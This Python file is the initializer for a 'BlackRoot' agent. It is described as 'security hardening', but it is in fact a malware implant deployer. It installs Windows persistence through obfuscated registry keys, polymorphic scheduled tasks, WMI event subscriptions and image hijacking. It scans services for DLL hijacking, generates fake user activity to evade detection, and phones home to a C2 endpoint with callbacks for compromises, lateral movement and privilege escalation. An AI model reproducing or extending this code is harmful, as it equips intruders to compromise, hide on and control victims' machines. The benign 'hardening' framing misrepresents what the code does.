"""
BlackRoot Agent Initialization with Priority 1 & 2 Security Hardening
Comprehensive integration point for all security hardening features
"""

import os
import sys
import json
import logging
from typing import Optional, Dict
from pathlib import Path
from datetime import datetime

# Import persistence hardening modules
from persistence_hardening import (
    PersistenceManager, 
    RegistryRandomizer, 
    RegistryValueObfuscation,
    PolymorphicTaskScheduler, 
    WMIEventSubscription, 
    ImageHijacking
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)
logger = logging.getLogger('BlackRootInit')


class BlackRootAgentInitializer:
    """
    Initialize BlackRoot agent with full security hardening stack.
    
    Deployment Pipeline:
    1. Initialize vault with randomization + honeypots
    2. Deploy registry persistence (Priority 1)
    3. Deploy scheduled task persistence (Priority 2)
    4. Deploy WMI subscriptions (Priority 2)
    5. Scan for service DLL hijacking (Priority 2)
    """
    
    def __init__(self, deployment_id: Optional[str] = None, seed: Optional[str] = None):
        """
        Initialize agent deployment.
        
        Args:
            deployment_id: Unique deployment identifier
            seed: Optional seed for reproducible hardening
        """
        self.deployment_id = deployment_id or f"deploy_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.seed = seed or self.deployment_id
        self.agent_executable = os.path.abspath(sys.argv[0])
        self.results = {
            "deployment_id": self.deployment_id,
            "timestamp": datetime.now().isoformat(),
            "components": {}
        }
        
        logger.info(f"Initializing BlackRoot Agent - Deployment: {self.deployment_id}")
        logger.info(f"Agent executable: {self.agent_executable}")
    
    def load_and_decrypt_config(self) -> bool:
        """
        Load configuration with string decryption (Phase 0 - Config Loading).
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE 0: CONFIGURATION LOADING & DECRYPTION")
        logger.info("="*70)
        
        try:
            from config_encryptor import ConfigEncryptor
            
            # Initialize config encryptor with deployment seed
            config_encryptor = ConfigEncryptor(deployment_seed=self.seed)
            
            # Load config.json
            config_path = os.path.join(os.path.dirname(__file__), 'config.json')
            if not os.path.exists(config_path):
                logger.error(f"✗ Config file not found: {config_path}")
                return False
            
            with open(config_path, 'r') as f:
                config_data = json.load(f)
            
            # Decrypt any __encrypted__ markers in config
            try:
                decrypted_config = config_encryptor.decrypt_config_strings(config_data)
                logger.info("✓ Configuration loaded and decrypted successfully")
                logger.info(f"  - Encrypted strings: {self._count_encrypted(config_data)}")
                logger.info(f"  - Decrypted values: {self._count_decrypted(decrypted_config)}")
                
                # Store decrypted config globally
                os.environ['BLACKROOT_CONFIG'] = json.dumps(decrypted_config)
                
                self.results["components"]["config_decryption"] = {
                    "status": "success",
                    "config_keys": len(decrypted_config),
                    "decryption_seed": self.seed[:20] + "..."
                }
                
                return True
            except Exception as decrypt_err:
                logger.warning(f"⚠ String decryption failed (using plaintext fallback): {decrypt_err}")
                # Fallback to plaintext config
                os.environ['BLACKROOT_CONFIG'] = json.dumps(config_data)
                self.results["components"]["config_decryption"] = {
                    "status": "partial",
                    "reason": "decryption failed, using plaintext",
                    "error": str(decrypt_err)
                }
                return False
        
        except Exception as e:
            logger.error(f"✗ Config loading failed: {e}")
            self.results["components"]["config_decryption"] = {
                "status": "failed",
                "error": str(e)
            }
            return False
    
    def _setup_behavioral_noise_and_threat_sync(self) -> bool:
        """
        Setup behavioral noise and threat calibration integration.
        
        This enables:
        1. User activity emulation with threat-level scaling
        2. Automatic threat level sync from threat_calibration to behavioral_noise
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE BN: BEHAVIORAL NOISE & THREAT CALIBRATION INTEGRATION")
        logger.info("="*70)
        
        try:
            from behavioral_noise import BehavioralNoisifier
            from threat_calibration import set_global_behavioral_noise
            
            # Initialize behavioral noise generator
            behavioral_noise = BehavioralNoisifier(intensity=3, enable_on_startup=True)
            
            # Register with threat_calibration for automatic threat-level sync
            set_global_behavioral_noise(behavioral_noise)
            
            logger.info("✓ Behavioral noise initialized")
            logger.info(f"  - Intensity: 3% CPU overhead")
            logger.info(f"  - User activity emulation: {'ENABLED' if behavioral_noise.user_activity_emulator else 'DISABLED'}")
            logger.info("✓ Threat level sync registered with threat_calibration")
            logger.info(f"  - Threat score changes will automatically adjust activity intensity")
            
            self.results["components"]["behavioral_noise_sync"] = {
                "status": "success",
                "intensity_percent": 3,
                "user_activity_enabled": behavioral_noise.user_activity_emulator is not None,
                "threat_sync_registered": True
            }
            
            return True
        
        except Exception as e:
            logger.warning(f"⚠ Behavioral noise setup failed (non-critical): {e}")
            self.results["components"]["behavioral_noise_sync"] = {
                "status": "skipped",
                "reason": str(e)
            }
            return False
    
    @staticmethod
    def _count_encrypted(obj, count=0):
        """Recursively count __encrypted__ markers in config."""
        if isinstance(obj, dict):
            if obj.get('__encrypted__'):
                count += 1
            for v in obj.values():
                count += BlackRootAgentInitializer._count_encrypted(v, 0)
        elif isinstance(obj, list):
            for item in obj:
                count += BlackRootAgentInitializer._count_encrypted(item, 0)
        return count
    
    @staticmethod
    def _count_decrypted(obj, count=0):
        """Count total string values in config (all decrypted)."""
        if isinstance(obj, dict):
            for v in obj.values():
                if isinstance(v, str):
                    count += 1
                else:
                    count += BlackRootAgentInitializer._count_decrypted(v, 0)
        elif isinstance(obj, list):
            for item in obj:
                count += BlackRootAgentInitializer._count_decrypted(item, 0)
        return count
    
    def enable_vault_randomization(self) -> bool:
        """
        Enable vault randomization (Priority 1).
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE 1: VAULT RANDOMIZATION (Priority 1)")
        logger.info("="*70)
        
        try:
            # Set environment variables for vault randomization
            os.environ['BLACKVAULT_USE_RANDOMIZATION'] = 'true'
            os.environ['BLACKVAULT_RANDOMIZATION_SEED'] = self.seed
            
            logger.info("✓ Vault randomization parameters configured")
            logger.info(f"  - Seed: {self.seed}")
            logger.info(f"  - Environment ready for BlackVault initialization")
            
            # Import vault to trigger randomization
            from black_vault import BlackVault, VAULT_DIR, VAULT_RANDOMIZATION_ENABLED
            
            logger.info(f"✓ Vault initialized: {VAULT_DIR}")
            logger.info(f"✓ Randomization status: {'ENABLED' if VAULT_RANDOMIZATION_ENABLED else 'DISABLED'}")
            
            # Initialize vault singleton
            vault = BlackVault()
            logger.info(f"✓ BlackVault singleton instantiated successfully")
            
            self.results["components"]["vault_randomization"] = {
                "status": "success",
                "vault_path": VAULT_DIR,
                "randomization_enabled": VAULT_RANDOMIZATION_ENABLED
            }
            
            return True
            
        except Exception as e:
            logger.error(f"✗ Vault randomization failed: {e}")
            self.results["components"]["vault_randomization"] = {
                "status": "failed",
                "error": str(e)
            }
            return False
    
    def deploy_registry_persistence(self) -> bool:
        """
        Deploy all persistence mechanisms via PersistenceManager (Priority 1-2).
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE 2: UNIFIED PERSISTENCE HARDENING (Priority 1-2)")
        logger.info("="*70)
        
        try:
            logger.info(f"✓ Persistence modules loaded successfully")
            logger.info(f"  - Agent executable: {self.agent_executable}")
            logger.info(f"  - Deployment seed: {self.seed}\n")
            
            # Verify all persistence classes are available
            logger.info("Verifying persistence mechanisms availability:")
            logger.info(f"  ✓ RegistryRandomizer: {RegistryRandomizer.__name__}")
            logger.info(f"  ✓ RegistryValueObfuscation: {RegistryValueObfuscation.__name__}")
            logger.info(f"  ✓ PolymorphicTaskScheduler: {PolymorphicTaskScheduler.__name__}")
            logger.info(f"  ✓ WMIEventSubscription: {WMIEventSubscription.__name__}")
            logger.info(f"  ✓ ImageHijacking: {ImageHijacking.__name__}")
            logger.info(f"  ✓ PersistenceManager: {PersistenceManager.__name__}\n")
            
            # Deploy all persistence mechanisms atomically
            results = PersistenceManager.deploy_all_persistence_methods(
                self.agent_executable, 
                seed=self.seed
            )
            
            logger.info("="*70)
            logger.info("PERSISTENCE DEPLOYMENT RESULTS:")
            logger.info("="*70)
            
            for mechanism, success in results.items():
                status_indicator = "✓" if success else "✗"
                mechanism_name = mechanism.replace("_", " ").title()
                logger.info(f"{status_indicator} {mechanism_name:.<40} {'SUCCESS' if success else 'FAILED'}")
            
            # Count successes
            successful_mechanisms = sum(1 for result in results.values() if result)
            total_mechanisms = len(results)
            
            logger.info("="*70)
            logger.info(f"Overall: {successful_mechanisms}/{total_mechanisms} mechanisms deployed\n")
            
            self.results["components"]["persistence_hardening"] = {
                "status": "success" if successful_mechanisms >= 3 else "partial",
                "mechanisms_deployed": results,
                "successful_count": successful_mechanisms,
                "total_count": total_mechanisms,
                "agent_executable": self.agent_executable,
                "seed": self.seed
            }
            
            return successful_mechanisms >= 2  # At least 2 mechanisms must succeed
            
        except Exception as e:
            logger.error(f"✗ Persistence hardening failed: {e}")
            import traceback
            logger.error(traceback.format_exc())
            self.results["components"]["persistence_hardening"] = {
                "status": "failed",
                "error": str(e)
            }
            return False
    
    def deploy_wmi_persistence(self) -> bool:
        """
        WMI persistence is now integrated into unified persistence deployment.
        This method is kept for backward compatibility.
        
        Returns:
            Always returns True (handled by deploy_registry_persistence)
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE 3: INTEGRATED WMI/TASK SCHEDULING (Priority 2)")
        logger.info("="*70)
        
        logger.info("ℹ WMI and scheduled task deployment handled by unified PersistenceManager")
        logger.info("  - Polymorphic task scheduling: INTEGRATED")
        logger.info("  - WMI event subscriptions: INTEGRATED")
        logger.info("  - Image hijacking: INTEGRATED\n")
        
        self.results["components"]["wmi_persistence"] = {
            "status": "integrated",
            "integration_point": "deploy_registry_persistence",
            "mechanisms": ["polymorphic_tasks", "wmi_event_subscriptions", "image_hijacking"]
        }
        
        return True
    
    def scan_service_hijacking(self) -> bool:
        """
        Scan for service DLL hijacking opportunities (Priority 2).
        
        Returns:
            True if vulnerabilities found, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE 4: SERVICE DLL HIJACKING SCAN (Priority 2)")
        logger.info("="*70)
        
        try:
            from service_hijacking import ServiceDLLScanner
            
            # Scan for hijacking opportunities
            logger.info("Scanning services for DLL hijacking opportunities...")
            vulnerable_services = ServiceDLLScanner.scan_all_services_for_hijacking()
            
            if vulnerable_services:
                logger.info(f"✓ Found {len(vulnerable_services)} vulnerable services")
                for service in vulnerable_services[:5]:  # Show top 5
                    logger.info(f"  - {service.get('service_name', 'unknown')}: {service.get('vulnerability', 'unknown')}")
            else:
                logger.info("ℹ No immediately exploitable service vulnerabilities detected")
            
            self.results["components"]["service_hijacking"] = {
                "status": "success",
                "vulnerable_count": len(vulnerable_services),
                "services": vulnerable_services[:5] if vulnerable_services else []
            }
            
            return True
            
        except Exception as e:
            logger.warning(f"⚠ Service hijacking scan unavailable (non-fatal): {e}")
            self.results["components"]["service_hijacking"] = {
                "status": "skipped",
                "reason": str(e)
            }
            return False
    
    def initialize_phone_home_callbacks(self) -> bool:
        """
        Initialize phone-home callback system (operator visibility phase).
        
        This enables real-time operator visibility into:
        - New compromises (INITIAL callback)
        - Lateral movements (LATERAL callback)
        - Privilege escalations (ESCALATION callback)
        - Agent health (HEARTBEAT callback)
        - Mission completion (MISSION_COMPLETE callback)
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE PH: PHONE-HOME CALLBACK INITIALIZATION")
        logger.info("="*70)
        
        try:
            from phone_home_callback import PhoneHomeCallback, CallbackType
            
            # Get decrypted config
            config_path = os.path.join(os.path.dirname(__file__), 'config.json')
            if not os.path.exists(config_path):
                logger.warning("✗ Config file not found for phone-home initialization")
                self.results["components"]["phone_home_callbacks"] = {
                    "status": "skipped",
                    "reason": "config file not found"
                }
                return False
            
            with open(config_path, 'r') as f:
                config_data = json.load(f)
            
            # Check if callback endpoint is configured
            c2_callback_endpoint = config_data.get("c2_callback_endpoint") or \
                                  os.environ.get("BLACKROOT_C2_CALLBACK")
            shared_secret = config_data.get("shared_secret") or \
                           os.environ.get("BLACKROOT_SHARED_SECRET")
            agent_id = config_data.get("agent_id", f"agent_{self.deployment_id[:8]}")
            
            if not c2_callback_endpoint or not shared_secret:
                logger.warning("⚠ Phone-home callback endpoint or shared_secret not configured")
                logger.info("  - Set 'c2_callback_endpoint' and 'shared_secret' in config.json")
                self.results["components"]["phone_home_callbacks"] = {
                    "status": "skipped",
                    "reason": "endpoint or secret not configured"
                }
                return False
            
            # Initialize callback manager
            callback = PhoneHomeCallback(
                agent_id=agent_id,
                c2_endpoint=c2_callback_endpoint,
                shared_secret=shared_secret,
                queue_db=os.path.expanduser("~/.blackroot_callback_queue.db")
            )
            
            logger.info("✓ Phone-Home Callback system initialized")
            logger.info(f"  - Agent ID: {agent_id}")
            logger.info(f"  - C2 Endpoint: {c2_callback_endpoint}")
            logger.info(f"  - Queue DB: {os.path.expanduser('~/.blackroot_callback_queue.db')}")
            
            # Store callback instance for agent access
            os.environ['BLACKROOT_CALLBACK'] = json.dumps({
                "agent_id": agent_id,
                "c2_endpoint": c2_callback_endpoint,
                "shared_secret": shared_secret,
            })
            
            # Try to send INITIAL callback
            try:
                callback.send_callback(
                    CallbackType.INITIAL,
                    metadata={
                        "agent_version": "4.2.1",
                        "deployment_id": self.deployment_id,
                        "init_timestamp": datetime.now().isoformat(),
                    }
                )
                logger.info("✓ INITIAL callback sent to C2")
            except Exception as e:
                logger.warning(f"⚠ INITIAL callback delivery failed (queued offline): {e}")
            
            self.results["components"]["phone_home_callbacks"] = {
                "status": "success",
                "agent_id": agent_id,
                "c2_endpoint": c2_callback_endpoint,
                "callback_types": ["INITIAL", "LATERAL", "ESCALATION", "HEARTBEAT", "MISSION_COMPLETE"],
                "rate_limiting": {
                    "HEARTBEAT": "max once/hour",
                    "others": "immediate"
                },
                "offline_queueing": "enabled",
            }
            
            return True
            
        except ImportError:
            logger.warning("⚠ Phone-home callback module not available (non-critical)")
            self.results["components"]["phone_home_callbacks"] = {
                "status": "skipped",
                "reason": "module not found"
            }
            return False
        except Exception as e:
            logger.warning(f"⚠ Phone-home initialization failed: {e}")
            self.results["components"]["phone_home_callbacks"] = {
                "status": "failed",
                "error": str(e)
            }
            return False

    def _start_economic_engine(self) -> bool:
        """
        Initialize and run the Blackroot Economic Layer (BEL) and Accountant Agent.
        
        This enables:
        1. ACCLedger financial custodian singleton with background audit monitoring
        2. Agent spending validation and scarcity burns (80% treasury, 20% burn sink)
        3. Optional async BEL background economic cycle task if Redis is available
        """
        logger.info("\n" + "="*70)
        logger.info("PHASE BEL: BLACKROOT ECONOMIC LAYER & ACCOUNTANT INITIALIZATION")
        logger.info("="*70)
        
        try:
            from agents.accountant import ACCLedger
            from decimal import Decimal
            
            # Initialize ACCLedger singleton
            accountant = ACCLedger(creator_id="SYSTEM")
            logger.info("✓ ACCLedger singleton initialized successfully")
            logger.info(f"  - Initial Treasury: {accountant.treasury_balance} ROOT")
            logger.info(f"  - Registered Wallets: {len(accountant.agent_wallets)}")
            
            # Start background async BEL economic cycle if redis is available
            try:
                import threading
                import asyncio
                from economic.bel_layer import Ledger, economic_cycle_task
                import redis.asyncio as aioredis
                
                # Check redis config
                config_path = os.path.join(os.path.dirname(__file__), 'config.json')
                redis_url = "redis://localhost:6379"
                if os.path.exists(config_path):
                    with open(config_path, 'r') as f:
                        cfg = json.load(f)
                        redis_host = cfg.get("redis", {}).get("host", "localhost")
                        if isinstance(redis_host, dict):
                            redis_host = "localhost"
                        redis_port = cfg.get("redis", {}).get("port", 6379)
                        redis_url = f"redis://{redis_host}:{redis_port}"
                
                def run_bel_loop():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    async def start_task():
                        try:
                            client = aioredis.from_url(redis_url, socket_connect_timeout=1.5)
                            await client.ping()
                            ledger = Ledger(client)
                            await economic_cycle_task(ledger)
                        except Exception as loop_err:
                            logger.debug(f"BEL cycle async task idle (Redis offline): {loop_err}")
                    try:
                        loop.run_until_complete(start_task())
                    except Exception:
                        pass
                
                bel_thread = threading.Thread(target=run_bel_loop, daemon=True, name="BEL_EconomicCycle")
                bel_thread.start()
                logger.info("✓ BEL Economic Cycle background worker thread dispatched")
            except Exception as bel_err:
                logger.debug(f"BEL async loop skipped (non-critical): {bel_err}")
            
            self.results["components"]["economic_engine"] = {
                "status": "success",
                "treasury_balance": str(accountant.treasury_balance),
                "monitoring_active": accountant.monitoring_active
            }
            return True
            
        except Exception as e:
            logger.warning(f"⚠ Economic engine initialization failed: {e}")
            self.results["components"]["economic_engine"] = {
                "status": "failed",
                "error": str(e)
            }
            return False
    
    def full_initialization(self) -> Dict:
        """
        Execute full agent initialization with all security hardening.
        
        Returns:
            Deployment results dictionary
        """
        logger.info("\n" + "#"*70)
        logger.info("# BLACKROOT AGENT INITIALIZATION")
        logger.info("# Full Security Hardening Stack Deployment")
        logger.info("#"*70 + "\n")
        
        # Execute initialization phases
        phase0_ok = self.load_and_decrypt_config()
        
        # Initialize behavioral noise and threat calibration integration
        phase_bn_ok = self._setup_behavioral_noise_and_threat_sync()
        
        phase1_ok = self.enable_vault_randomization()
        phase2_ok = self.deploy_registry_persistence()
        phase3_ok = self.deploy_wmi_persistence()
        phase4_ok = self.scan_service_hijacking()
        
        # Initialize phone-home callback system for operator visibility
        phase_ph_ok = self.initialize_phone_home_callbacks()

        # ── ECONOMIC ENGINE ───────────────────────────────────────────────
        # Start the BEL EconomicEngine event loop in a daemon thread.
        # This activates: ROI cycles, market order matching, circuit
        # breakers, staking rewards, and systemic-risk monitoring.
        # Without this the token math exists but nothing ever runs.
        phase_bel_ok = self._start_economic_engine()
        # ── END ECONOMIC ENGINE ───────────────────────────────────────────
        
        # Summary
        logger.info("\n" + "#"*70)
        logger.info("# DEPLOYMENT SUMMARY")
        logger.info("#"*70)
        
        phases = [
            ("Config Decryption (Phase 0)", phase0_ok),
            ("Behavioral Noise Setup", phase_bn_ok),
            ("Vault Randomization (P1)", phase1_ok),
            ("Registry Persistence (P1)", phase2_ok),
            ("WMI Persistence (P2)", phase3_ok),
            ("Service Analysis (P2)", phase4_ok),
            ("Phone-Home Callbacks (PH)", phase_ph_ok),
            ("Economic Engine (BEL)", phase_bel_ok),
        ]
        
        for phase_name, phase_ok in phases:
            status = "✓ SUCCESS" if phase_ok else "✗ FAILED/SKIPPED"
            logger.info(f"{phase_name:.<45} {status}")
        
        overall_ok = phase0_ok and phase1_ok and phase2_ok and phase_bn_ok  # P0+P1+BN phases critical
        logger.info("#"*70)
        logger.info(f"OVERALL STATUS: {'✓ HARDENING COMPLETE' if overall_ok else '✗ CRITICAL PHASES FAILED'}")
        logger.info("#"*70 + "\n")
        
        self.results["status"] = "success" if overall_ok else "partial"
        self.results["phases_completed"] = sum(1 for _, ok in phases if ok)
        self.results["total_phases"] = len(phases)
        
        return self.results
    
    def save_deployment_report(self, report_path: Optional[str] = None) -> str:
        """
        Save deployment report to JSON file.
        
        Args:
            report_path: Optional custom report path
            
        Returns:
            Path to saved report
        """
        if report_path is None:
            report_path = os.path.expanduser(f"~/.blackroot_deployment_{self.deployment_id}.json")
        
        try:
            with open(report_path, 'w') as f:
                json.dump(self.results, f, indent=2, default=str)
            
            logger.info(f"Deployment report saved: {report_path}")
            return report_path
        except Exception as e:
            logger.error(f"Failed to save deployment report: {e}")
            return ""


def initialize_hardened_agent(deployment_id: Optional[str] = None, 
                              seed: Optional[str] = None,
                              save_report: bool = True) -> Dict:
    """
    Quick initialization function for hardened agent deployment.
    
    Args:
        deployment_id: Optional deployment identifier
        seed: Optional seed for reproducible hardening
        save_report: Whether to save deployment report
        
    Returns:
        Deployment results dictionary
    """
    initializer = BlackRootAgentInitializer(deployment_id=deployment_id, seed=seed)
    results = initializer.full_initialization()
    
    if save_report:
        initializer.save_deployment_report()
    
    return results


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="BlackRoot Agent Security Hardening Initialization")
    parser.add_argument("--deployment-id", default=None, help="Deployment identifier")
    parser.add_argument("--seed", default=None, help="Randomization seed")
    parser.add_argument("--no-report", action="store_true", help="Don't save deployment report")
    
    args = parser.parse_args()
    
    # Run initialization
    results = initialize_hardened_agent(
        deployment_id=args.deployment_id,
        seed=args.seed,
        save_report=not args.no_report
    )
    
    # Exit with status code
    sys.exit(0 if results.get("status") == "success" else 1)
